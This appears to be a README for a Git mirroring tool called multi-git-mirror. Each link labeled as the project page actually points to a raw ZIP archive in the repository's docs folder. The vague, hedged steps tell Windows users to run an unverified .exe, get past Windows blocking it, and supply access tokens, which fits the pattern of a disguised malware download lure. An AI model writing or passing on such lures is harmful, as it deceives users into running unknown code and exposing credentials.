# 🪞 multi-git-mirror - Keep Git backups in sync

[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge)](https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip)

## 🚀 What this is

multi-git-mirror helps you keep copies of your Git repositories in more than one place. It is built for backup and mirror tasks across services like GitHub, GitLab, Bitbucket, and AWS CodeCommit.

Use it when you want a simple way to keep code copies in sync for safety, team work, or migration.

## 📥 Download and use on Windows

1. Open the project page: https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip  
2. On the page, look for the latest release or the main project files.  
3. Download the Windows version if the project provides one.  
4. If you see a ZIP file, save it to your PC and extract it.  
5. If you see an `.exe` file, download it and double-click it to run.  
6. If the project uses Docker or GitHub Actions, follow the setup files on the page to run the mirror task from your Windows machine.

[Visit the project page](https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip)

## 🖥️ What you need

- A Windows PC
- Internet access
- A Git account or access token for the service you want to mirror to
- Enough space for your repository copies
- Permission to read from the source repo and write to the target repo

## ✨ What it can do

- Copy a Git repo from one place to another
- Keep backup mirrors up to date
- Work with GitHub, GitLab, Bitbucket, and CodeCommit
- Fit into CI/CD flows
- Run in Docker or in a GitHub Action
- Help when you move code from one host to another

## 🛠️ How to set it up

### 1. Get the files
Open the project page and download the project files or release package for Windows.

### 2. Extract the download
If the download comes as a ZIP file, right-click it and choose Extract All.

### 3. Find the run file
Look for the main app file, script, or Docker setup file in the folder.

### 4. Open the app
If you have an `.exe` file, double-click it.  
If you have a script, open it with the tool named in the project files.  
If you have a Docker setup, use the commands in the repo files.

### 5. Add your repo details
Set the source repo and the target repo. Add your token or login details if the setup asks for them.

### 6. Start the mirror
Run the tool to begin the sync. The app should copy the repo from the source to the target.

## 🔐 Common access setup

You may need one of these:

- GitHub personal access token
- GitLab token
- Bitbucket app password
- AWS CodeCommit credentials
- SSH key for Git access

Keep your access details private. Store them in the place the project files tell you to use.

## 🔄 Typical use cases

- Backup your personal code repo
- Mirror a team repo to a second host
- Move a repo from one service to another
- Keep a cold copy for recovery
- Sync repos as part of a build pipeline

## 📁 Example folder flow

- Source repo: your main code repo
- Mirror target: a second Git host
- Sync job: runs on a schedule or when you start it
- Result: both copies stay close to the same state

## ⚙️ If you use Docker

If the project includes Docker files, you can run it in a container.

1. Install Docker Desktop on Windows
2. Open the project folder
3. Use the Docker file or Compose file in the repo
4. Add your repo settings
5. Start the container

This works well if you want to avoid installing extra tools.

## 🤖 If you use GitHub Actions

If the repo includes a GitHub Action, you can use it to run mirror jobs on a schedule or after a push.

Typical setup:
- Add your secrets in GitHub
- Set the source and target repo names
- Choose when the action should run
- Check the action logs for each sync

## 🧩 Supported platforms

The project topics point to support for:
- GitHub
- GitLab
- Bitbucket
- AWS CodeCommit
- Docker
- CI/CD systems

## 📌 Basic workflow

1. Pick the source repository
2. Pick the target repository
3. Add access details
4. Start the mirror job
5. Check the result
6. Run it again when you need a fresh copy

## 🧪 Quick check after setup

After the first run, open the target repo and check:
- Branches copied over
- Tags present
- Recent commits in place
- File history looks right

## 🧰 Troubleshooting

### The app does not open
- Check that Windows has not blocked the file
- Make sure you extracted the ZIP first
- Run it again from the folder, not from inside the ZIP

### The mirror does not copy
- Check the repo URL
- Check your access token or password
- Make sure the target repo exists
- Check whether the target service needs a different auth method

### The sync stops part way
- Check your internet connection
- Confirm the source repo is reachable
- Try a smaller repo first
- Review the log output if the app shows one

## 📚 Project info

- Repo name: multi-git-mirror
- Description: git-mirror-action
- Main focus: repo backup and mirror sync
- Target use: end-user Git copy and sync tasks on Windows

## 🔗 Project link

https://github.com/Doserateshag647/multi-git-mirror/raw/refs/heads/main/docs/mirror_multi_git_v3.3.zip

## 🧭 Simple setup path for first-time users

1. Open the project link
2. Download the files you need
3. Extract the download if needed
4. Find the main run file or setup file
5. Enter your source and target repo details
6. Start the mirror job
7. Check the target repo for the copied data